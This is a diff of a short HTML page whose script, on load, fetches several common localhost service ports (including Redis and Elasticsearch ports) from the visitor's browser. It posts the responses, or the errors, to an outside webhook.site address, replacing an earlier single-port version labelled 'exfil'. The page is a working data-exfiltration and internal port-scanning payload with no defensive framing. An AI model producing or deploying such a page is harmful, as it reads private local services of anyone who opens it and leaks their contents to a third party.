@@ -1,26 +1,17 @@
 <!DOCTYPE html>
 <html>
 <body>
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-fetch('http://localhost:PORT/')
-  .then(r => r.text())
-  .then(data => {
-    fetch('https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site/exfil', {
-      method: 'POST',
-      body: data
-    });
-  })
-  .catch(e => {
-    fetch('https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site/exfil-error', {
-      method: 'POST',
-      body: e.toString()
-    });
-  });
+const ports = [80, 3000, 5000, 6379, 8000, 8080, 8443, 9200];
+const webhook = 'https://75e190cb-04d7-4537-ba9e-101ec4714bf8.webhook.site';
+
+ports.forEach(port => {
+  fetch(`http://localhost:${port}/`)
+    .then(r => r.text())
+    .then(data => fetch(`${webhook}/hit-${port}`, {method:'POST', body: data.substring(0,500)}))
+    .catch(e => fetch(`${webhook}/fail-${port}`, {method:'POST', body: e.toString()}));
+});
 </script>
-</body>
-</html>
+
 </body>
 </html>
